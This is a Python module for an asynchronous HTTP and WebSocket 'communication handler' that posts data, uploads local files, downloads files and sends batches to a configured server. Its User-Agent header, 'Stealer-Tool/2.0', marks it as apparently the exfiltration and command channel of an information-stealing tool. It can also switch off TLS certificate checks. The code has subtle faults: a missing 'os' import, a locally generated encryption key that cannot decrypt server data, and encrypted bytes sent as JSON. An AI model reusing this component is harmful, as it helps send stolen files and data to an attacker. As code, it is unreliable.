"""
Advanced Communication Handler
Handles secure communication, data transmission, and network operations.
"""

import asyncio
import aiohttp
import ssl
import json
import logging
from typing import Dict, Any, Optional, List, Tuple
from urllib.parse import urljoin, urlparse
import websockets
from cryptography.fernet import Fernet
import base64
import time
from dataclasses import dataclass
import hashlib

@dataclass
class CommunicationConfig:
    """Configuration for communication settings."""
    server_url: str
    api_key: str
    timeout: int = 30
    retry_attempts: int = 3
    verify_ssl: bool = True
    encryption_enabled: bool = True
    compression_enabled: bool = True

@dataclass
class TransmissionResult:
    """Result of data transmission."""
    success: bool
    response_data: Optional[Dict[str, Any]] = None
    error: Optional[str] = None
    status_code: Optional[int] = None
    transmission_time: Optional[float] = None

class CommunicationHandler:
    """
    Advanced communication handler with secure transmission capabilities.
    """
    
    def __init__(self, config: CommunicationConfig):
        """
        Initialize the communication handler.
        
        Args:
            config: Communication configuration
        """
        self.config = config
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize communication components
        self._session = None
        self._websocket = None
        self._encryption_key = None
        self._connection_pool = {}
        
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    async def initialize(self):
        """Initialize communication components."""
        try:
            # Create SSL context
            ssl_context = ssl.create_default_context()
            if not self.config.verify_ssl:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
            
            # Create aiohttp session
            connector = aiohttp.TCPConnector(
                ssl=ssl_context,
                limit=100,
                limit_per_host=30,
                ttl_dns_cache=300,
                use_dns_cache=True
            )
            
            timeout = aiohttp.ClientTimeout(total=self.config.timeout)
            
            self._session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': 'Stealer-Tool/2.0',
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
            )
            
            # Initialize encryption if enabled
            if self.config.encryption_enabled:
                self._encryption_key = Fernet.generate_key()
            
            self.logger.info("Communication handler initialized successfully")
            
        except Exception as e:
            self.logger.error(f"Failed to initialize communication handler: {e}")
            raise
    
    async def close(self):
        """Close communication connections."""
        try:
            if self._session:
                await self._session.close()
            
            if self._websocket:
                await self._websocket.close()
            
            self.logger.info("Communication handler closed")
            
        except Exception as e:
            self.logger.error(f"Error closing communication handler: {e}")
    
    async def send_data(self, endpoint: str, data: Dict[str, Any], 
                       method: str = 'POST') -> TransmissionResult:
        """
        Send data to server endpoint.
        
        Args:
            endpoint: API endpoint
            data: Data to send
            method: HTTP method
            
        Returns:
            Transmission result
        """
        start_time = time.time()
        
        try:
            if not self._session:
                await self.initialize()
            
            # Prepare data
            prepared_data = await self._prepare_data(data)
            
            # Build URL
            url = urljoin(self.config.server_url, endpoint)
            
            # Add authentication
            headers = {'Authorization': f'Bearer {self.config.api_key}'}
            
            # Send request with retries
            for attempt in range(self.config.retry_attempts):
                try:
                    async with self._session.request(
                        method=method,
                        url=url,
                        json=prepared_data,
                        headers=headers
                    ) as response:
                        
                        response_data = await response.json()
                        
                        if response.status == 200:
                            transmission_time = time.time() - start_time
                            self.logger.info(f"Data sent successfully to {endpoint}")
                            
                            return TransmissionResult(
                                success=True,
                                response_data=response_data,
                                status_code=response.status,
                                transmission_time=transmission_time
                            )
                        else:
                            self.logger.warning(f"Server returned status {response.status}")
                            
                except asyncio.TimeoutError:
                    self.logger.warning(f"Request timeout (attempt {attempt + 1})")
                    if attempt == self.config.retry_attempts - 1:
                        raise
                    await asyncio.sleep(2 ** attempt)  # Exponential backoff
                    
                except Exception as e:
                    self.logger.warning(f"Request failed (attempt {attempt + 1}): {e}")
                    if attempt == self.config.retry_attempts - 1:
                        raise
                    await asyncio.sleep(2 ** attempt)
            
        except Exception as e:
            transmission_time = time.time() - start_time
            self.logger.error(f"Data transmission failed: {e}")
            
            return TransmissionResult(
                success=False,
                error=str(e),
                transmission_time=transmission_time
            )
    
    async def receive_data(self, endpoint: str) -> TransmissionResult:
        """
        Receive data from server endpoint.
        
        Args:
            endpoint: API endpoint
            
        Returns:
            Transmission result
        """
        start_time = time.time()
        
        try:
            if not self._session:
                await self.initialize()
            
            # Build URL
            url = urljoin(self.config.server_url, endpoint)
            
            # Add authentication
            headers = {'Authorization': f'Bearer {self.config.api_key}'}
            
            async with self._session.get(url, headers=headers) as response:
                if response.status == 200:
                    response_data = await response.json()
                    transmission_time = time.time() - start_time
                    
                    # Decrypt if needed
                    if self.config.encryption_enabled:
                        response_data = await self._decrypt_data(response_data)
                    
                    self.logger.info(f"Data received successfully from {endpoint}")
                    
                    return TransmissionResult(
                        success=True,
                        response_data=response_data,
                        status_code=response.status,
                        transmission_time=transmission_time
                    )
                else:
                    self.logger.error(f"Server returned status {response.status}")
                    return TransmissionResult(
                        success=False,
                        error=f"HTTP {response.status}",
                        status_code=response.status,
                        transmission_time=time.time() - start_time
                    )
                    
        except Exception as e:
            transmission_time = time.time() - start_time
            self.logger.error(f"Data reception failed: {e}")
            
            return TransmissionResult(
                success=False,
                error=str(e),
                transmission_time=transmission_time
            )
    
    async def upload_file(self, endpoint: str, file_path: str, 
                         metadata: Optional[Dict[str, Any]] = None) -> TransmissionResult:
        """
        Upload file to server.
        
        Args:
            endpoint: Upload endpoint
            file_path: Path to file to upload
            metadata: File metadata
            
        Returns:
            Transmission result
        """
        start_time = time.time()
        
        try:
            if not self._session:
                await self.initialize()
            
            # Build URL
            url = urljoin(self.config.server_url, endpoint)
            
            # Prepare headers
            headers = {'Authorization': f'Bearer {self.config.api_key}'}
            
            # Prepare form data
            data = aiohttp.FormData()
            
            # Add file
            with open(file_path, 'rb') as f:
                file_data = f.read()
                
                # Encrypt file if needed
                if self.config.encryption_enabled:
                    file_data = await self._encrypt_data(file_data)
                
                data.add_field('file', file_data, filename=os.path.basename(file_path))
            
            # Add metadata
            if metadata:
                data.add_field('metadata', json.dumps(metadata))
            
            # Upload file
            async with self._session.post(url, data=data, headers=headers) as response:
                response_data = await response.json()
                transmission_time = time.time() - start_time
                
                if response.status == 200:
                    self.logger.info(f"File uploaded successfully: {file_path}")
                    
                    return TransmissionResult(
                        success=True,
                        response_data=response_data,
                        status_code=response.status,
                        transmission_time=transmission_time
                    )
                else:
                    self.logger.error(f"Upload failed with status {response.status}")
                    
                    return TransmissionResult(
                        success=False,
                        error=f"HTTP {response.status}",
                        status_code=response.status,
                        transmission_time=transmission_time
                    )
                    
        except Exception as e:
            transmission_time = time.time() - start_time
            self.logger.error(f"File upload failed: {e}")
            
            return TransmissionResult(
                success=False,
                error=str(e),
                transmission_time=transmission_time
            )
    
    async def download_file(self, endpoint: str, file_path: str) -> TransmissionResult:
        """
        Download file from server.
        
        Args:
            endpoint: Download endpoint
            file_path: Path to save downloaded file
            
        Returns:
            Transmission result
        """
        start_time = time.time()
        
        try:
            if not self._session:
                await self.initialize()
            
            # Build URL
            url = urljoin(self.config.server_url, endpoint)
            
            # Add authentication
            headers = {'Authorization': f'Bearer {self.config.api_key}'}
            
            async with self._session.get(url, headers=headers) as response:
                if response.status == 200:
                    file_data = await response.read()
                    
                    # Decrypt if needed
                    if self.config.encryption_enabled:
                        file_data = await self._decrypt_data(file_data)
                    
                    # Save file
                    with open(file_path, 'wb') as f:
                        f.write(file_data)
                    
                    transmission_time = time.time() - start_time
                    self.logger.info(f"File downloaded successfully: {file_path}")
                    
                    return TransmissionResult(
                        success=True,
                        status_code=response.status,
                        transmission_time=transmission_time
                    )
                else:
                    self.logger.error(f"Download failed with status {response.status}")
                    
                    return TransmissionResult(
                        success=False,
                        error=f"HTTP {response.status}",
                        status_code=response.status,
                        transmission_time=time.time() - start_time
                    )
                    
        except Exception as e:
            transmission_time = time.time() - start_time
            self.logger.error(f"File download failed: {e}")
            
            return TransmissionResult(
                success=False,
                error=str(e),
                transmission_time=transmission_time
            )
    
    async def establish_websocket(self, endpoint: str) -> bool:
        """
        Establish WebSocket connection.
        
        Args:
            endpoint: WebSocket endpoint
            
        Returns:
            True if successful
        """
        try:
            # Build WebSocket URL
            ws_url = self.config.server_url.replace('http', 'ws')
            url = urljoin(ws_url, endpoint)
            
            # Add authentication
            headers = {'Authorization': f'Bearer {self.config.api_key}'}
            
            # Create SSL context
            ssl_context = ssl.create_default_context()
            if not self.config.verify_ssl:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
            
            # Connect to WebSocket
            self._websocket = await websockets.connect(
                url,
                extra_headers=headers,
                ssl=ssl_context,
                ping_interval=20,
                ping_timeout=10
            )
            
            self.logger.info(f"WebSocket connection established: {endpoint}")
            return True
            
        except Exception as e:
            self.logger.error(f"WebSocket connection failed: {e}")
            return False
    
    async def send_websocket_message(self, message: Dict[str, Any]) -> bool:
        """
        Send message via WebSocket.
        
        Args:
            message: Message to send
            
        Returns:
            True if successful
        """
        try:
            if not self._websocket:
                raise ConnectionError("WebSocket not connected")
            
            # Prepare message
            prepared_message = await self._prepare_data(message)
            
            # Send message
            await self._websocket.send(json.dumps(prepared_message))
            
            self.logger.debug("WebSocket message sent")
            return True
            
        except Exception as e:
            self.logger.error(f"WebSocket message send failed: {e}")
            return False
    
    async def receive_websocket_message(self) -> Optional[Dict[str, Any]]:
        """
        Receive message via WebSocket.
        
        Returns:
            Received message or None
        """
        try:
            if not self._websocket:
                raise ConnectionError("WebSocket not connected")
            
            # Receive message
            message = await self._websocket.recv()
            data = json.loads(message)
            
            # Decrypt if needed
            if self.config.encryption_enabled:
                data = await self._decrypt_data(data)
            
            self.logger.debug("WebSocket message received")
            return data
            
        except Exception as e:
            self.logger.error(f"WebSocket message receive failed: {e}")
            return None
    
    async def _prepare_data(self, data: Any) -> Any:
        """
        Prepare data for transmission (encrypt, compress, etc.).
        
        Args:
            data: Data to prepare
            
        Returns:
            Prepared data
        """
        try:
            # Convert to JSON if needed
            if isinstance(data, (dict, list)):
                data = json.dumps(data)
            
            # Encrypt if enabled
            if self.config.encryption_enabled and isinstance(data, str):
                data = await self._encrypt_data(data.encode())
            
            return data
            
        except Exception as e:
            self.logger.error(f"Data preparation failed: {e}")
            raise
    
    async def _encrypt_data(self, data: bytes) -> bytes:
        """
        Encrypt data using Fernet.
        
        Args:
            data: Data to encrypt
            
        Returns:
            Encrypted data
        """
        try:
            if not self._encryption_key:
                self._encryption_key = Fernet.generate_key()
            
            fernet = Fernet(self._encryption_key)
            encrypted_data = fernet.encrypt(data)
            
            return encrypted_data
            
        except Exception as e:
            self.logger.error(f"Data encryption failed: {e}")
            raise
    
    async def _decrypt_data(self, encrypted_data: bytes) -> bytes:
        """
        Decrypt data using Fernet.
        
        Args:
            encrypted_data: Encrypted data
            
        Returns:
            Decrypted data
        """
        try:
            if not self._encryption_key:
                raise ValueError("No encryption key available")
            
            fernet = Fernet(self._encryption_key)
            decrypted_data = fernet.decrypt(encrypted_data)
            
            return decrypted_data
            
        except Exception as e:
            self.logger.error(f"Data decryption failed: {e}")
            raise
    
    async def ping_server(self) -> bool:
        """
        Ping server to check connectivity.
        
        Returns:
            True if server is reachable
        """
        try:
            result = await self.send_data('/ping', {})
            return result.success
            
        except Exception as e:
            self.logger.error(f"Server ping failed: {e}")
            return False
    
    async def get_server_status(self) -> Dict[str, Any]:
        """
        Get server status information.
        
        Returns:
            Server status data
        """
        try:
            result = await self.send_data('/status', {})
            if result.success:
                return result.response_data
            else:
                return {'error': result.error}
                
        except Exception as e:
            self.logger.error(f"Server status check failed: {e}")
            return {'error': str(e)}
    
    async def batch_transmit(self, transmissions: List[Tuple[str, Dict[str, Any]]]) -> List[TransmissionResult]:
        """
        Transmit multiple data packets in batch.
        
        Args:
            transmissions: List of (endpoint, data) tuples
            
        Returns:
            List of transmission results
        """
        try:
            tasks = []
            for endpoint, data in transmissions:
                task = self.send_data(endpoint, data)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Convert exceptions to TransmissionResult
            processed_results = []
            for result in results:
                if isinstance(result, Exception):
                    processed_results.append(TransmissionResult(
                        success=False,
                        error=str(result)
                    ))
                else:
                    processed_results.append(result)
            
            self.logger.info(f"Batch transmission completed: {len(transmissions)} items")
            return processed_results
            
        except Exception as e:
            self.logger.error(f"Batch transmission failed: {e}")
            return [TransmissionResult(success=False, error=str(e)) for _ in transmissions]
    
    def get_connection_stats(self) -> Dict[str, Any]:
        """
        Get connection statistics.
        
        Returns:
            Connection statistics
        """
        try:
            stats = {
                'session_active': self._session is not None,
                'websocket_active': self._websocket is not None,
                'encryption_enabled': self.config.encryption_enabled,
                'server_url': self.config.server_url,
                'timeout': self.config.timeout,
                'retry_attempts': self.config.retry_attempts
            }
            
            if self._session:
                connector = self._session.connector
                stats.update({
                    'connection_limit': connector.limit,
                    'per_host_limit': connector.limit_per_host,
                    'dns_cache_ttl': connector.ttl_dns_cache
                })
            
            return stats
            
        except Exception as e:
            self.logger.error(f"Failed to get connection stats: {e}")
            return {'error': str(e)}